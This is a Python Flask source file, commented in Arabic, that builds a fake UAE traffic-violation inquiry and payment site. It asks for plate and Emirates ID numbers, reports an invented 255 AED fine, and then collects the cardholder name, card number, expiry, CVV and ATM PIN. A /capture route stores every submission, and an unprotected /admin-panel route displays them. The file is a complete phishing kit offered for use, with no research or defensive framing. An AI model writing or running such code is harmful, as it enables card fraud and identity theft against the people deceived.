import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
captured_data = []

# --- 1. الهيدر الموحد (الصورتين اللي بعتهم فقط) ---
HEADER_HTML = """
<div class="fixed-header">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
    <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
</div>
"""

STYLE = """
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #f4f4f4; font-family: sans-serif; overflow-x: hidden; }
    .fixed-header { position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; background: white; }
    .fixed-header img { width: 100%; height: auto; display: block; }
    .container { margin-top: 155px; position: relative; width: 100%; }
    .img-box { position: relative; width: 100%; }
    .img-box img { width: 100%; height: auto; display: block; }
    
    /* أزرار الصفحة الرئيسية */
    .btn-action { position: absolute; top: 68%; left: 5%; width: 90%; height: 10%; background: rgba(0,0,0,0); border: none; cursor: pointer; z-index: 100; }
    .btn-new { position: absolute; top: 80%; left: 5%; width: 90%; height: 10%; background: rgba(0,0,0,0); border: none; cursor: pointer; z-index: 100; }
    
    /* ستايل فورم الاستعلام */
    .search-card { background: white; max-width: 500px; margin: 20px auto; border-radius: 12px; border: 1px solid #ddd; padding: 25px; }
    .btn-gold { background: #b0914f; color: white; width: 100%; padding: 16px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 18px; }
    input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; text-align: right; }
</style>
"""

# --- الصفحة الرئيسية (واجهة الموقع) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}</head>
<body>
{HEADER_HTML}
<div class="container">
    <div class="img-box">
        <img src="https://static.wixstatic.com/media/a9f3d9_60aea158216544beaf9ee02cb9bd8bc2~mv2.jpg">
        <button class="btn-action" onclick="window.location.href='/search';"></button>
        <button class="btn-new" onclick="window.location.href='/search';"></button>
    </div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg"></div>
</div>
</body>
</html>
"""

# --- صفحة الاستعلام (الصفحة الثانية اللي فيها صورة السيارة والبيانات) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}</head>
<body>
{HEADER_HTML}
<div class="container">
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%; max-width:500px; margin:0 auto; display:block;">
    <div class="search-card">
        <h3 style="text-align:center; color:#b0914f;">استعلام المخالفات المرورية</h3>
        <form action="/checkout" method="get">
            <label>الإمارة:</label>
            <select><option>أبوظبي</option><option>دبي</option><option>الشارقة</option></select>
            <input type="text" placeholder="رقم اللوحة / الرمز" required>
            <input type="text" placeholder="رقم الهوية الإماراتية" required>
            <button type="submit" class="btn-gold">بحث عن المخالفات</button>
        </form>
    </div>
</div>
</body>
</html>
"""

# باقي المسارات (الدفع والتحكم)
@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout():
    return f"{HEADER_HTML}{STYLE}<div class='container' style='text-align:center; padding:40px;'><h2>تم العثور على مخالفة: 255 AED</h2><button onclick='location.href=\"/pay\"' style='background:#b0914f; color:white; padding:15px; border:none; border-radius:6px;'>المتابعة للدفع</button></div>"

@app.route('/pay')
def pay():
    return f"""{HEADER_HTML}{STYLE}<div class='container' style='padding:20px; max-width:400px; margin:auto; background:white; border-top:8px solid #b0914f;'>
    <h3 style='text-align:center;'>بوابة السداد الرقمية</h3>
    <form action='/capture' method='post'>
        <input type='text' name='n' placeholder='الاسم على البطاقة' style='width:100%; padding:12px; margin:5px 0;' required>
        <input type='text' name='c' placeholder='رقم البطاقة (16 رقم)' style='width:100%; padding:12px; margin:5px 0;' required>
        <div style='display:flex; gap:10px;'><input type='text' name='e' placeholder='MM/YY' style='flex:1; padding:12px;'><input type='text' name='v' placeholder='CVV' style='flex:1; padding:12px;'></div>
        <input type='password' name='p' placeholder='ATM PIN (4 أرقام)' style='width:100%; padding:12px; margin:5px 0;' required>
        <button type='submit' style='width:100%; padding:15px; background:#b0914f; color:white; border:none; border-radius:6px; font-weight:bold;'>تأكيد السداد</button>
    </form></div>"""

@app.route('/capture', methods=['POST'])
def capture():
    captured_data.insert(0, request.form.to_dict())
    return "<h2 style='text-align:center; padding:50px;'>جاري معالجة الطلب... يرجى انتظار الرمز</h2>"

@app.route('/admin-panel')
def admin():
    return f"<body style='background:#0f172a; color:white; padding:20px;'><h1>سجل المعاملات:</h1><p>{captured_data}</p></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
